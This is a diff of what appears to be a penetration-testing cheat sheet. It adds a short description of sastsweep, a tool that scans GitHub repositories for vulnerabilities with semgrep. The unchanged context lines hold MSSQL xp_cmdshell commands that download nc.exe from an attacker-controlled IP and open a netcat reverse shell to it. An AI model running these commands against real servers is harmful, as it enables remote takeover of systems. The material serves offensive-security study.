@@ -410,3 +410,10 @@ enable_xp_cmdshell
 xp_cmdshell "powershell.exe wget http://192.168.119.134/nc.exe -OutFile C:\\Users\Public\nc.exe"
 xp_cmdshell "C:\Users\Public\nc.exe -e cmd.exe 192.168.119.134 443
 ```
+
+# Sastsweep
+Sweep github repos with:
+
+https://github.com/chebuya/sastsweep
+
+sastsweep is a tool designed for identifying vulnerabilities in open source codebases at scale. It can gather and filter on key repository metrics such as popularity and project size, enabling targeted vulnerability research. It automatically detects potential vulnerabilities using semgrep and provides a streamlined HTML report, allowing researchers to quickly drill down to the affected portion of the codebase.
